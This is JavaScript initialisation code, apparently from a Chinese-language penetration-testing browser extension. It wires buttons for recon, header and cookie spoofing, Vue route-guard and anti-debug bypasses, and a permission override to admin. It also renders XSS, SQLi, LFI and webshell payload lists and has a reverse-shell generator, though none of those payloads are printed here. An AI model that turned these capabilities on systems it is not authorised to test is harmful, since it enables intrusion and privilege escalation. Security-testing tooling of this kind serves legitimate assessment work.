          var kp = sm2.generateKeyPairHex();
          var pubEl = utils.get('sm2-pubkey');
          if (pubEl) pubEl.value = kp.publicKey;
          var priEl = utils.get('sm2-prikey');
          if (priEl) priEl.value = kp.privateKey;
          utils.showToast('密钥对已生成', 'success');
        } catch (e) {
          utils.showToast('生成失败: ' + e.message, 'error');
        }
      });

    // Initial IV visibility
    toggleIvVisibility('aes', 'aes-iv-group', 'aes-mode');
    toggleIvVisibility('des', 'des-iv-group', 'des-mode');
    switchCryptoAlgo('aes');

    // RSA genkey
    var rsaGenBtn = utils.get('rsa-genkey-btn');
    if (rsaGenBtn) rsaGenBtn.addEventListener('click', rsaGenerateKeyPair);

    // Favicon buttons
    const faviconBtn = utils.get('extract-favicon-btn');
    if (faviconBtn) faviconBtn.addEventListener('click', extractFavicon);

    const copyHashBtn = utils.get('copy-favicon-hash-btn');
    if (copyHashBtn)
      copyHashBtn.addEventListener('click', () => {
        const hash = utils.get('favicon-hash').textContent;
        if (hash === '-') {
          utils.showToast('请先提取图标', 'warning');
          return;
        }
        utils.copyText(hash);
        utils.showToast('已复制 Hash', 'success');
      });

    // Asset mapping
    document.querySelectorAll('.source-btn').forEach(btn => {
      btn.addEventListener('click', () => switchAssetSource(btn.dataset.source));
    });

    const scanBtn = utils.get('asset-scan-btn');
    if (scanBtn) scanBtn.addEventListener('click', handleAssetScan);

    const saveKeysBtn = utils.get('save-keys-btn');
    if (saveKeysBtn) saveKeysBtn.addEventListener('click', saveApiKeys);

    const clearKeysBtn = utils.get('clear-keys-btn');
    if (clearKeysBtn) clearKeysBtn.addEventListener('click', clearApiKeys);

    loadApiKeys();

    // Info gather
    document.querySelectorAll('.gather-tab').forEach(btn => {
      btn.addEventListener('click', () => switchGatherTab(btn.dataset.gather));
    });
    const gatherBtn = utils.get('gather-btn');
    if (gatherBtn) gatherBtn.addEventListener('click', gatherInfo);
    const gatherCopyBtn = utils.get('gather-copy-btn');
    if (gatherCopyBtn) {
      gatherCopyBtn.addEventListener('click', () => {
        const list = gatherData[currentGatherTab] || [];
        if (list.length === 0) {
          utils.showToast('没有可复制的内容', 'warning');
          return;
        }
        const text = list.map(i => i.value).join('\n');
        utils.copyText(text);
        utils.showToast('已复制 ' + list.length + ' 条', 'success');
      });
    }

    // Link extract
    const linksExtractBtn = utils.get('links-extract-btn');
    if (linksExtractBtn) linksExtractBtn.addEventListener('click', extractLinks);
    const linksCopyBtn = utils.get('links-copy-btn');
    if (linksCopyBtn) {
      linksCopyBtn.addEventListener('click', () => {
        const filtered = getFilteredLinks();
        if (filtered.length === 0) {
          utils.showToast('没有链接', 'warning');
          return;
        }
        utils.copyText(filtered.map(l => l.href).join('\n'));
        utils.showToast('已复制 ' + filtered.length + ' 个链接', 'success');
      });
    }
    const linksSendBtn = utils.get('links-send-multiurl-btn');
    if (linksSendBtn) {
      linksSendBtn.addEventListener('click', () => {
        const filtered = getFilteredLinks().filter(l => !l.isMailto && !l.isJS);
        if (filtered.length === 0) {
          utils.showToast('没有可发送的链接', 'warning');
          return;
        }
        utils.get('multiurl-input').value = filtered.map(l => l.href).join('\n');
        updateMultiurlInfo(filtered.length);
        document
          .querySelectorAll('.tab-btn')
          .forEach(b => b.classList.toggle('active', b.dataset.panel === 'multiurl'));
        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
        document.getElementById('panel-multiurl').classList.add('active');
        utils.showToast('已发送 ' + filtered.length + ' 个链接', 'success');
      });
    }
    const linksFilter = utils.get('links-filter');
    if (linksFilter) linksFilter.addEventListener('input', renderLinks);
    const linksFilterType = utils.get('links-filter-type');
    if (linksFilterType) linksFilterType.addEventListener('change', renderLinks);

    // URL multi-open
    const multiurlInput = utils.get('multiurl-input');
    if (multiurlInput) {
      multiurlInput.addEventListener('input', () => updateMultiurlInfo(parseUrls().length));
    }
    const multiurlOpenBtn = utils.get('multiurl-open-btn');
    if (multiurlOpenBtn) multiurlOpenBtn.addEventListener('click', handleMultiurlOpen);
    const multiurlDedupBtn = utils.get('multiurl-dedup-btn');
    if (multiurlDedupBtn) multiurlDedupBtn.addEventListener('click', handleMultiurlDedup);
    const multiurlClearBtn = utils.get('multiurl-clear-btn');
    if (multiurlClearBtn)
      multiurlClearBtn.addEventListener('click', () => {
        utils.get('multiurl-input').value = '';
        updateMultiurlInfo(0);
      });

    // Tab save
    const tabsaveGrabBtn = utils.get('tabsave-grab-btn');
    if (tabsaveGrabBtn) tabsaveGrabBtn.addEventListener('click', grabAllTabs);
    const tabsaveCopyBtn = utils.get('tabsave-copy-btn');
    if (tabsaveCopyBtn) tabsaveCopyBtn.addEventListener('click', copySavedTabUrls);
    const tabsaveExportBtn = utils.get('tabsave-export-btn');
    if (tabsaveExportBtn) tabsaveExportBtn.addEventListener('click', exportSavedTabUrls);

    // History
    const historyBtn = utils.get('history-query-btn');
    if (historyBtn) historyBtn.addEventListener('click', queryHistory);

    const historyCopyUrlBtn = utils.get('history-copy-url-btn');
    if (historyCopyUrlBtn) {
      historyCopyUrlBtn.addEventListener('click', async () => {
        let raw = utils.get('history-domain').value.trim();
        if (!raw) {
          const d = await getCurrentDomain();
          if (!d) {
            utils.showToast('请输入域名或打开一个网页', 'warning');
            return;
          }
          raw = d;
        }
        const domain = extractDomain(raw);
        utils.get('history-domain').value = domain;
        const cdxUrl = buildCdxUrl(domain);
        utils.copyText(cdxUrl);
        utils.showToast('查询URL已复制', 'success');
      });
    }

    const historyDomainInput = utils.get('history-domain');
    if (historyDomainInput) {
      historyDomainInput.addEventListener('keydown', e => {
        if (e.key === 'Enter') queryHistory();
      });
      historyDomainInput.addEventListener('blur', () => {
        const val = historyDomainInput.value.trim();
        if (val) showHistoryQuickLinks(val);
      });

      // Auto-fill domain when switching to history panel
      document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          if (btn.dataset.panel === 'history') {
            if (!historyDomainInput.value.trim()) {
              getCurrentDomain().then(d => {
                if (d) historyDomainInput.value = d;
              });
            }
          }
        });
      });
    }

    const historyCopyResultBtn = utils.get('history-copy-result-btn');
    if (historyCopyResultBtn) {
      historyCopyResultBtn.addEventListener('click', () => {
        if (lastHistoryResults.length === 0) {
          utils.showToast('没有结果', 'warning');
          return;
        }
        const text = lastHistoryResults.map(i => i.raw || i.url).join('\n');
        utils.copyText(text);
        utils.showToast('已复制 ' + lastHistoryResults.length + ' 条', 'success');
      });
    }

    const historyTypeFilter = utils.get('history-type-filter');
    if (historyTypeFilter) {
      historyTypeFilter.addEventListener('input', () => {
        if (lastHistoryResults.length === 0) return;
        const filtered = filterByType(lastHistoryResults, historyTypeFilter.value);
        renderHistoryResults(filtered);
        utils.get('history-status').textContent =
          '筛选: ' + filtered.length + ' / ' + lastHistoryResults.length + ' 条';
      });
    }

    const historyCopyFilteredBtn = utils.get('history-copy-filtered-btn');
    if (historyCopyFilteredBtn) {
      historyCopyFilteredBtn.addEventListener('click', () => {
        if (lastHistoryResults.length === 0) {
          utils.showToast('没有结果', 'warning');
          return;
        }
        const typeFilter = historyTypeFilter ? historyTypeFilter.value : '';
        const filtered = filterByType(lastHistoryResults, typeFilter);
        if (filtered.length === 0) {
          utils.showToast('没有匹配的结果', 'warning');
          return;
        }
        const text = filtered.map(i => i.raw || i.url).join('\n');
        utils.copyText(text);
        utils.showToast('已复制 ' + filtered.length + ' 条', 'success');
      });
    }

    const historySendLinksBtn = utils.get('history-send-links-btn');
    if (historySendLinksBtn) {
      historySendLinksBtn.addEventListener('click', () => {
        if (lastHistoryResults.length === 0) {
          utils.showToast('没有结果', 'warning');
          return;
        }
        const urls = lastHistoryResults.map(i => i.url).filter(u => u && !u.startsWith('mailto:'));
        if (urls.length === 0) {
          utils.showToast('没有可用的URL', 'warning');
          return;
        }
        utils.get('multiurl-input').value = urls.join('\n');
        updateMultiurlInfo(urls.length);
        document
          .querySelectorAll('.tab-btn')
          .forEach(b => b.classList.toggle('active', b.dataset.panel === 'multiurl'));
        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
        document.getElementById('panel-multiurl').classList.add('active');
        utils.showToast('已发送 ' + urls.length + ' 个链接', 'success');
      });
    }

    // EXIF viewer
    initExifDragDrop();
    checkExifPending();

    document.querySelectorAll('.exif-mode-btn').forEach(btn => {
      btn.addEventListener('click', () => switchExifMode(btn.dataset.mode));
    });

    const exifFetchBtn = utils.get('exif-fetch-btn');
    if (exifFetchBtn) {
      const handler = () => {
        const url = utils.get('exif-url-input').value.trim();
        if (!url) {
          utils.showToast('请输入图片URL', 'warning');
          return;
        }
        fetchExifFromUrl(url);
      };
      exifFetchBtn.addEventListener('click', handler);
      utils.get('exif-url-input')?.addEventListener('keydown', e => {
        if (e.key === 'Enter') handler();
      });
    }

    const exifScanBtn = utils.get('exif-scan-page-btn');
    if (exifScanBtn) exifScanBtn.addEventListener('click', scanPageImages);

    const exifCopyAllBtn = utils.get('exif-copy-all-btn');
    if (exifCopyAllBtn) {
      exifCopyAllBtn.addEventListener('click', () => {
        if (!lastExifData) {
          utils.showToast('没有元数据', 'warning');
          return;
        }
        const text = Object.entries(lastExifData)
          .map(([k, v]) => k + ': ' + v)
          .join('\n');
        utils.copyText(text);
        utils.showToast('已复制全部元数据', 'success');
      });
    }

    // Request Spoofing
    document.querySelectorAll('.spoof-tab').forEach(btn => {
      btn.addEventListener('click', () => switchSpoofTab(btn.dataset.spoof));
    });

    const uaCategoryEl = utils.get('ua-category');
    if (uaCategoryEl) {
      uaCategoryEl.addEventListener('change', () => renderUaList(uaCategoryEl.value));
      renderUaList('desktop');
    }

    const uaApplyBtn = utils.get('spoof-ua-apply');
    if (uaApplyBtn) uaApplyBtn.addEventListener('click', applyUserAgent);
    const uaResetBtn = utils.get('spoof-ua-reset');
    if (uaResetBtn) uaResetBtn.addEventListener('click', resetUserAgent);

    const cookieRefreshBtn = utils.get('cookie-refresh-btn');
    if (cookieRefreshBtn) cookieRefreshBtn.addEventListener('click', loadCookies);
    const cookieAddBtn = utils.get('cookie-add-btn');
    if (cookieAddBtn) cookieAddBtn.addEventListener('click', showCookieAddEditor);
    const cookieImportBtn = utils.get('cookie-import-btn');
    if (cookieImportBtn) cookieImportBtn.addEventListener('click', showCookieImportDialog);
    const cookieClearBtn = utils.get('cookie-clear-btn');
    if (cookieClearBtn) cookieClearBtn.addEventListener('click', clearAllCookies);

    const headerApplyBtn = utils.get('header-apply');
    if (headerApplyBtn) headerApplyBtn.addEventListener('click', applyHeaders);
    const headerResetBtn = utils.get('header-reset');
    if (headerResetBtn) headerResetBtn.addEventListener('click', resetHeaders);
    const customHeaderAddBtn = utils.get('custom-header-add');
    if (customHeaderAddBtn) customHeaderAddBtn.addEventListener('click', addCustomHeaderRow);

    const initialRemoveBtn = document.querySelector('.custom-header-remove');
    if (initialRemoveBtn)
      initialRemoveBtn.addEventListener('click', function () {
        this.closest('.custom-header-row').remove();
      });

    const refererPresetEl = utils.get('referer-preset');
    if (refererPresetEl) {
      refererPresetEl.addEventListener('change', () => {
        const v = refererPresetEl.value;
        const refererInput = utils.get('header-referer');
        if (!refererInput) return;
        if (v === 'none') refererInput.value = '';
        else if (v === 'google') refererInput.value = 'https://www.google.com/';
        else if (v === 'baidu') refererInput.value = 'https://www.baidu.com/';
        else if (v === 'same') refererInput.value = '';
      });
    }

    chrome.storage.local.get(['pentest_spoof'], result => {
      const saved = result.pentest_spoof;
      if (saved) {
        if (saved.ua) Object.assign(spoofState.ua, saved.ua);
        if (saved.headers) Object.assign(spoofState.headers, saved.headers);
        updateUaStatus();
      }
    });

    // Vue Analysis
    const vueDetectBtn = utils.get('vue-detect-btn');
    if (vueDetectBtn) vueDetectBtn.addEventListener('click', detectVue);
    const vueExportBtn = utils.get('vue-export-routes-btn');
    if (vueExportBtn) vueExportBtn.addEventListener('click', exportVueRoutes);
    const vueBypassBtn = utils.get('vue-bypass-guards-btn');
    if (vueBypassBtn) vueBypassBtn.addEventListener('click', bypassVueGuards);
    const vueCopyBtn = utils.get('vue-copy-btn');
    if (vueCopyBtn) {
      vueCopyBtn.addEventListener('click', () => {
        if (!lastVueResult) {
          utils.showToast('没有可复制的内容', 'warning');
          return;
        }
        utils.copyText(lastVueResult);
        utils.showToast('已复制', 'success');
      });
    }

    // Vue sub-tabs
    document.querySelectorAll('.vue-stab').forEach(btn => {
      btn.addEventListener('click', () => switchVueSubTab(btn.dataset.vstab));
    });

    // Permission menu interception
    const permStartBtn = utils.get('perm-start-btn');
    if (permStartBtn) permStartBtn.addEventListener('click', startPermInterception);
    const permStopBtn = utils.get('perm-stop-btn');
    if (permStopBtn) permStopBtn.addEventListener('click', stopPermInterception);
    const permRefreshBtn = utils.get('perm-refresh-btn');
    if (permRefreshBtn) permRefreshBtn.addEventListener('click', refreshPermCaptured);
    const permFilter = utils.get('perm-filter');
    if (permFilter) permFilter.addEventListener('input', renderPermList);
    const permTypeFilter = utils.get('perm-type-filter');
    if (permTypeFilter) permTypeFilter.addEventListener('change', renderPermList);
    const permDetailBack = utils.get('perm-detail-back');
    if (permDetailBack)
      permDetailBack.addEventListener('click', () => {
        permViewMode = 'list';
        utils.get('perm-captured-list').classList.remove('hidden');
        const filterRow = utils.get('perm-filter-row');
        if (filterRow) filterRow.classList.remove('hidden');
        utils.get('perm-detail').classList.add('hidden');
      });
    const permOpenAllBtn = utils.get('perm-open-all');
    if (permOpenAllBtn) permOpenAllBtn.addEventListener('click', permOpenAll);
    const permChangeAdminBtn = utils.get('perm-change-admin');
    if (permChangeAdminBtn) permChangeAdminBtn.addEventListener('click', permChangeAdmin);
    const permApplyBtn = utils.get('perm-apply-btn');
    if (permApplyBtn) permApplyBtn.addEventListener('click', applyPermOverride);
    const permCopyJsonBtn = utils.get('perm-copy-json');
    if (permCopyJsonBtn)
      permCopyJsonBtn.addEventListener('click', () => {
        const val = utils.get('perm-json-editor').value;
        if (!val) {
          utils.showToast('没有数据', 'warning');
          return;
        }
        utils.copyText(val);
        utils.showToast('已复制', 'success');
      });

    const permExpandIdsBtn = utils.get('perm-expand-ids');
    if (permExpandIdsBtn) permExpandIdsBtn.addEventListener('click', permExpandMenuIds);

    const compareInjectBtn = utils.get('compare-inject-btn');
    if (compareInjectBtn)
      compareInjectBtn.addEventListener('click', () => {
        switchVueSubTab('perm');
        if (permSelectedIndex < 0 && permCapturedData.length > 0) {
          permSelectedIndex = 0;
          showPermDetail(0);
        } else if (permSelectedIndex >= 0) {
          showPermDetail(permSelectedIndex);
        }
        autoInjectHiddenRoutes();
      });

    // JS keyword search
    const jssearchBtn = utils.get('jssearch-btn');
    if (jssearchBtn)
      jssearchBtn.addEventListener('click', () => {
        searchJsKeywords(utils.get('jssearch-keyword').value.trim());
      });
    const jssearchInput = utils.get('jssearch-keyword');
    if (jssearchInput)
      jssearchInput.addEventListener('keydown', e => {
        if (e.key === 'Enter') searchJsKeywords(jssearchInput.value.trim());
      });
    document.querySelectorAll('.jssearch-preset').forEach(btn => {
      btn.addEventListener('click', () => {
        utils.get('jssearch-keyword').value = btn.dataset.kw;
        searchJsKeywords(btn.dataset.kw);
      });
    });

    // Route vs menu comparison
    const compareBtn = utils.get('compare-btn');
    if (compareBtn) compareBtn.addEventListener('click', compareRoutesAndMenu);
    const compareCopyHidden = utils.get('compare-copy-hidden');
    if (compareCopyHidden)
      compareCopyHidden.addEventListener('click', () => {
        const items = utils.get('compare-results').querySelectorAll('.compare-route-path');
        const hiddenPaths = [];
        items.forEach(el => {
          const parentItem = el.closest('.compare-route-item');
          if (parentItem && parentItem.querySelector('.compare-route-hidden')) {
            hiddenPaths.push(el.textContent);
          }
        });
        if (hiddenPaths.length === 0) {
          utils.showToast('没有隐藏路由', 'warning');
          return;
        }
        utils.copyText(hiddenPaths.join('\n'));
        utils.showToast('已复制 ' + hiddenPaths.length + ' 条隐藏路由', 'success');
      });

    // Auto-traverse routes
    const traverseStartBtn = utils.get('traverse-start-btn');
    if (traverseStartBtn) traverseStartBtn.addEventListener('click', startTraverseRoutes);
    const traverseStopBtn = utils.get('traverse-stop-btn');
    if (traverseStopBtn) traverseStopBtn.addEventListener('click', stopTraverse);

    // JS Control
    document.querySelectorAll('.jsctrl-tab').forEach(btn => {
      btn.addEventListener('click', () => switchJsCtrlTab(btn.dataset.ctrl));
    });
    const jsDisableBtn = utils.get('js-disable-btn');
    if (jsDisableBtn) jsDisableBtn.addEventListener('click', disableJs);
    const jsEnableBtn = utils.get('js-enable-btn');
    if (jsEnableBtn) jsEnableBtn.addEventListener('click', enableJs);
    const antidebugScanBtn = utils.get('antidebug-scan-btn');
    if (antidebugScanBtn) antidebugScanBtn.addEventListener('click', scanAntiDebug);
    const antidebugBypassBtn = utils.get('antidebug-bypass-btn');
    if (antidebugBypassBtn) antidebugBypassBtn.addEventListener('click', bypassAntiDebug);
    const antidebugClearBtn = utils.get('antidebug-clear-btn');
    if (antidebugClearBtn) antidebugClearBtn.addEventListener('click', clearScriptBlock);

    // Remove copy restrictions
    const uncopyBtn = utils.get('uncopy-btn');
    if (uncopyBtn) uncopyBtn.addEventListener('click', removeCopyRestrictions);

    // Restore perm intercept state
    chrome.storage.local.get(['permInterceptTabId'], result => {
      if (result.permInterceptTabId) {
        chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
          if (tabs[0] && tabs[0].id === result.permInterceptTabId) {
            permInterceptActive = true;
            const startBtn = utils.get('perm-start-btn');
            const stopBtn = utils.get('perm-stop-btn');
            if (startBtn) startBtn.disabled = true;
            if (stopBtn) stopBtn.disabled = false;
            const statusEl = utils.get('perm-status');
            if (statusEl) statusEl.textContent = '拦截中... 页面刷新后会自动重新注入';
            // Fetch captured data and start auto-refresh
            refreshPermCaptured();
            startPermAutoRefresh();
          } else {
            chrome.storage.local.remove('permInterceptTabId');
          }
        });
      }
    });

    // Restore JS toggle state
    chrome.storage.local.get(['js_blocked_tabId'], result => {
      if (result.js_blocked_tabId) {
        chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
          if (tabs[0] && tabs[0].id === result.js_blocked_tabId) {
            jsBlocked = true;
            updateJsToggleStatus();
          } else {
            chrome.storage.local.remove('js_blocked_tabId');
          }
        });
      }
    });

    // Restore gather data for current tab
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      const currentUrl = tabs[0]?.url || '';
      chrome.storage.local.get(['gatherData', 'gatherDataUrl'], result => {
        if (result.gatherData && result.gatherDataUrl === currentUrl) {
          gatherData = result.gatherData;
          renderGatherTab();
          const total = Object.values(gatherData).reduce((s, a) => s + a.length, 0);
          const statusEl = utils.get('gather-status');
          if (statusEl) statusEl.textContent = '已恢复，共 ' + total + ' 条';
        }
      });
      chrome.storage.local.get(['allLinks', 'allLinksUrl'], result => {
        if (result.allLinks && result.allLinksUrl === currentUrl) {
          allLinks = result.allLinks;
          renderLinks();
          const statusEl = utils.get('links-count');
          if (statusEl) statusEl.textContent = '已恢复，共 ' + allLinks.length + ' 个链接';
        }
      });
    });

    // Theme toggle
    const themeBtn = document.getElementById('theme-toggle');
    if (themeBtn) {
      const themes = ['light', 'dark'];
      const saved = localStorage.getItem('pentest-theme');
      if (saved) document.documentElement.setAttribute('data-theme', saved);
      themeBtn.addEventListener('click', () => {
        const current = document.documentElement.getAttribute('data-theme') || 'light';
        const next = themes[(themes.indexOf(current) + 1) % themes.length];
        document.documentElement.setAttribute('data-theme', next);
        localStorage.setItem('pentest-theme', next);
      });
    }

    // Payload tab switching
    document.querySelectorAll('.payload-tab').forEach(btn => {
      if (btn.dataset.ptab) btn.addEventListener('click', () => switchPayloadTab(btn.dataset.ptab));
    });

    // Payload data rendering
    renderPayloadCategories('xss-categories', XSS_DATA, false);
    renderSqliPayloads();
    renderPayloadCategories('lfi-categories', LFI_DATA, false);
    renderPayloadCategories('webshell-categories', WEBSHELL_DATA, false);
    renderPayloadCategories('cmdref-categories', CMDREF_DATA, false);
    renderAllReverseShells();

    // Reverse shell
    const revshellGen = utils.get('revshell-gen-btn');
    if (revshellGen) revshellGen.addEventListener('click', generateReverseShell);
    const revshellCopy = utils.get('revshell-copy-btn');
    if (revshellCopy)
      revshellCopy.addEventListener('click', () => {
        const output = utils.get('revshell-output');
        if (output && output.value) {
          utils.copyText(output.value);
          utils.showToast('已复制命令', 'success', 1000);
        }
      });
    const revshellType = utils.get('revshell-type');
    if (revshellType) revshellType.addEventListener('change', generateReverseShell);
    const revshellIp = utils.get('revshell-ip');
    if (revshellIp) revshellIp.addEventListener('input', generateReverseShell);
    const revshellPort = utils.get('revshell-port');
    if (revshellPort) revshellPort.addEventListener('input', generateReverseShell);

    // SQL injection regenerate
    const sqliRegen = utils.get('sqli-regen-btn');
    if (sqliRegen) sqliRegen.addEventListener('click', renderSqliPayloads);
    const sqliColumns = utils.get('sqli-columns');
    if (sqliColumns) sqliColumns.addEventListener('change', renderSqliPayloads);
    const sqliTable = utils.get('sqli-table');
    if (sqliTable) sqliTable.addEventListener('input', renderSqliPayloads);

    // Status bar clock
    const statusTime = utils.get('status-time');
    if (statusTime) {
      const update = () => {
        const now = new Date();
        statusTime.textContent =
          String(now.getHours()).padStart(2, '0') + ':' + String(now.getMinutes()).padStart(2, '0');
      };
      update();
      setInterval(update, 30000);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp);
  } else {
    initApp();
  }
})();
